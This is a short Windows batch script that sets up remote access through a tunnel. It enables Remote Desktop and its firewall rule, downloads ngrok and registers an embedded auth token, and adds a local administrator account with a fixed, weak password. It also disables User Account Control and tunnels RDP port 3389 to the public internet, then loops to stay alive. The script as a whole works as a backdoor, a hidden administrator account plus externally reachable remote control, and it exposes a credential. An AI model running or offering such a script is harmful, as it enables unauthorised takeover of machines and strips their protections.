reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

powershell -command "Invoke-WebRequest -Uri 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip' -OutFile 'ngrok.zip'"
powershell -command "Expand-Archive 'ngrok.zip' -DestinationPath 'C:\ngrok'"
C:\ngrok\ngrok.exe authtoken 2Zt7LQI3bZ9W7eoz1MlqV2VqKLR_5DgBpuYVzG5KJYPFgC4zw

net user Admin P@ssw0rd. /add
net localgroup Administrators Admin /add

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

@echo off
start "Ngrok" "C:\ngrok\ngrok.exe" tcp 3389

:loop
echo Döngü Loop Working! %time%
timeout /t 60 /nobreak
goto loop
